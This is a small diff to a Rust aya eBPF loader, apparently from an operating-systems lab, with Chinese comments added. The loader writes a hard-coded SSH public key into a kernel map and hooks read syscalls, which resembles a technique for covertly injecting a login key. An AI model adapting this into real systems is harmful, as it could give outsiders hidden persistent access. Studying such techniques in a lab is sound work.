@@ -1,8 +1,7 @@
-use std::borrow::BorrowMut;
-
 use aya::{include_bytes_aligned, maps::Array, programs::trace_point::TracePoint, Ebpf};
 use aya_log::EbpfLogger;
 use log::{debug, info, warn};
+use std::borrow::BorrowMut;
 use tokio::signal;
 
 #[tokio::main]
@@ -37,12 +36,16 @@ async fn main() -> Result<(), anyhow::Error> {
         warn!("failed to initialize eBPF logger: {}", e);
     }
 
+    // 登录机器的密钥
     let pub_key = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCB+4dWCiR08aJcJFrVxX4eFlxs5+3JFI8J9+hiPjIk54tnlEd9cUjJznWNWdtNiP8mZKPOQucA52pmfqXXiKzNwf5KbGDrX9Q/kCgVJwe/vri6QGTIklTLMCKxX7IAqACrJXgQ1dkVeKWzNhRT/CVn7tngfxPpDhUN0mAzB3MAgk+xQHkz2xEKfYOT47Zhji4CbZKYrPzK0GVvLbxUNHfHa3z7vpfgso2BT3ODTv7KFa6uW1Faumf9sT4WLLL0MSGHTdbuFpqFDEGswAl/NlehSD5P5sK33QL9n+oeLNksx0SyNNSBFpfRqcn9AJWIJOdDJiAT2CJ02rbXQoBtao7W3McVyCRyxpAkr0/5gAOK3bVrs6cQh1/+fsdHWDBEe/SReFlHGBsOf6P9AWRkWIlPcVGlaeTxkKVXeEYmcJLeEsVE5+q8bkVfIeL+LQL1nBuWZl5SuSmbOpzYcpRw2VzczLDQSPdC1UL9V59enK64ALBPxakOYCRqLCWq+RODpsM= oslab@rust\n";
     let mut string_array: Array<&mut aya::maps::MapData, [u8; 564]> =
         Array::try_from(bpf.map_mut("string_array").unwrap())?;
 
+    // 将这个密钥写入 map(Array) 中
     string_array.borrow_mut().set(0, pub_key, 0)?;
 
+    // 挂载两个函数点，一个是 sys_enter_read
+    // 另一个是 sys_exit_read
     let sys_enter_read_point: &mut TracePoint = bpf
         .program_mut("tracepoint_sys_enter_read")
         .unwrap()
